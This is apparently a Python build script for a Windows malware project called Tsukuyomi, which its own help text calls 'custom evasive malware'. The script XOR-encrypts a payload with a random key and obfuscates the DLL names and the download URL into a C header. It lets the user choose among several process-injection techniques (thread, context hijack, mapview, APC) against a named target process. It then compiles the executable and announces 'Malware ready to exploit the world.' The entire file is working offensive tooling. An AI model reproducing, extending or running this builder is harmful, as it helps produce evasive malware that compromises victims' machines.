#!/usr/bin/python3

import argparse
import os

# -------------------------------------------------------------------------------------------------

def encryptString(plain, cipher, key):
    i = 0
    while i < len(plain):
        j = 0
        while j < len(key) and i < len(plain):
            cipher.append((plain[i]^key[j]))
            i += 1
            j +=1

def printEncryptedString(f, string):
    output = '{ '
    for byte in string:
        output += hex(byte)
        output += ', '
    output = output[:-2] + ' }'
    f.write(output)

# -------------------------------------------------------------------------------------------------

parser = argparse.ArgumentParser(prog='python .\Builder',
                                 description='This script is used to generate a custom evasive malware which is able to inject a malicious payload.',                           
                                 add_help=True,
                                 allow_abbrev=True,
                                 exit_on_error=True)


extraction_group  = parser.add_argument_group('EXTRACTION PHASE')
encryption_group = parser.add_argument_group('OBFUSCATION PHASE')
injection_group   = parser.add_argument_group('INJECTION PHASE')
output_group   = parser.add_argument_group('OUTPUT')

extraction_group.add_argument('--extraction', action='store', type=str, choices=['download', 'resources'], required=True, help='Allows to specify how to find the payload to inject.')
extraction_group.add_argument('--payload_location', action='store', type=str, required=True, help='Specify the filepath of the payload.')
extraction_group.add_argument('--url', action='store', default='none', type=str, required=False, help='Specify the url from which the malware will download the paylaod.')


encryption_group.add_argument('--encryption', action='store', default='none', type=str, choices=['xor'], required=False, help='Allows to specify which type of encryption to apply to the payload.')

injection_group.add_argument('--injection', action='store', type=str, choices=['thread', 'context', 'mapview', 'APCLazy', 'APCEager'], required=True, help='Allows to specify the injection technique.')
injection_group.add_argument('--target_name', action='store', type=str, required=True, help='Specify the name of the program on which to perform the injection.')

encryption_group.add_argument('--output', action='store', default='none', type=str, required=False, help='Allows to specify the name of the malware.')


arguments = parser.parse_args()

# -------------------------------------------------------------------------------------------------

command = 'del ' + 'payload.raw' + ' > NUL'
os.system(command)
command = 'del ' + 'obfuscated.raw' + ' > NUL'
os.system(command)
command = 'del ' + 'Customization.h' + ' > NUL'
os.system(command)
command = 'del ' + '*.exe' + ' > NUL'
os.system(command)

# -------------------------------------------------------------------------------------------------

f_header = open('Customization.h', 'w')
f_header.write('#pragma once\n\n')

key = os.urandom(10)
f_header.write('#define KEY ')
printEncryptedString(f_header, key)
f_header.write('\n\n')

# -------------------------------------------------------------------------------------------------

command = 'copy ' + arguments.payload_location + ' payload.raw' + ' > NUL'
if (os.system(command) != 0):
    print('[!] Something went wrong\n\n')
    exit()

# -------------------------------------------------------------------------------------------------

if arguments.extraction == 'download':
    f_header.write('#define DOWNLOAD 1\n')

    ws2_plain     = [0x77, 0x00, 0x73, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2e, 0x00, 0x64, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x00, 0x00 ]
    wininet_plain = [0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x65, 0x00, 0x74, 0x00, 0x2e, 0x00, 0x64, 0x00, 0x6c, 0x00, 0x6c, 0x00, 0x00, 0x00]

    if arguments.url != 'none':
        url_plain  = bytes(arguments.url, "utf-8")
        url_plain  += b'\x00\x00'
    else:
        print('[!] Wrong arguments\n\n')
        parser.print_usage()
        exit()

    ws2_cipher = []
    encryptString(ws2_plain, ws2_cipher, key)
    wininet_cipher = []
    encryptString(wininet_plain, wininet_cipher, key)
    url_cipher = []
    encryptString(url_plain, url_cipher, key)

    f_header.write('#define WS2_OBFUSCATED ')
    printEncryptedString(f_header, ws2_cipher)
    f_header.write('\n')
    f_header.write('#define WININET_OBFUSCATED ')
    printEncryptedString(f_header, wininet_cipher)
    f_header.write('\n')
    f_header.write('#define URL_OBFUSCATED ')
    printEncryptedString(f_header, url_cipher)
    f_header.write('\n\n')
    command = 'devenv /RemoveItem Tsukuyomi.vcxproj Resource.rc > NUL'
    os.system(command)
elif arguments.extraction == 'resources':
    f_header.write('#define RESOURCE 1\n\n')
    command = 'devenv /AddItem Tsukuyomi.vcxproj Resource.rc > NUL'
    os.system(command)
else:
    print('[!] Wrong arguments\n\n')
    parser.print_usage()
    exit()

# -------------------------------------------------------------------------------------------------

if arguments.encryption == 'xor':
    f_header.write('#define XOR 1\n\n')

    f_plaintext = open('payload.raw', 'rb')
    f_ciphertext = open('obfuscated.raw', 'ab')
    plaintext_byte = f_plaintext.read(1)
    i = 0
    while plaintext_byte:
        f_ciphertext.write((int.from_bytes(plaintext_byte, 'big')^key[i]).to_bytes(1, 'big'))
        plaintext_byte = f_plaintext.read(1)
        i = (i+1) % len(key)
    f_plaintext.close()
    f_ciphertext.close()
else:
    command = 'move ' + 'payload.raw' + ' obfuscated.raw' + ' > NUL'
    if (os.system(command) != 0):
        print('[!] Something went wrong\n\n')
        exit()

payload_size = os.path.getsize('obfuscated.raw')
f_header.write('#define PAYLOAD_SIZE ' + str(payload_size) + '\n\n')

# -------------------------------------------------------------------------------------------------

if arguments.injection == 'thread':
    f_header.write('#define THREADINJECTION 1\n')
elif arguments.injection == 'context':
    f_header.write('#define CONTEXTINJECTION 1\n')
elif arguments.injection == 'mapview':
    f_header.write('#define MAPVIEWINJECTION 1\n')
elif arguments.injection == 'APCLazy':
    f_header.write('#define APCLAZYINJECTION 1\n')
elif arguments.injection == 'APCEager':
    f_header.write('#define APCEAGERINJECTION 1\n')
else:
    print('[!] Wrong arguments\n\n')
    parser.print_usage()
    exit()

f_header.write('#define PROCESS ' + '"' + arguments.target_name + '"' + '\n')
f_header.close()

# -------------------------------------------------------------------------------------------------

print('Building the malware...')

command = 'devenv Tsukuyomi.sln /build Debug > log.txt'
if (os.system(command) != 0):
    print('[!] Something went wrong\n\n')
    exit()

command = 'move ' + 'x64\Debug\Tsukuyomi.exe' + ' ' + arguments.output + ' > NUL'
if (os.system(command) != 0):
    print('[!] Something went wrong\n\n')
    exit()

print('Malware ready to exploit the world.')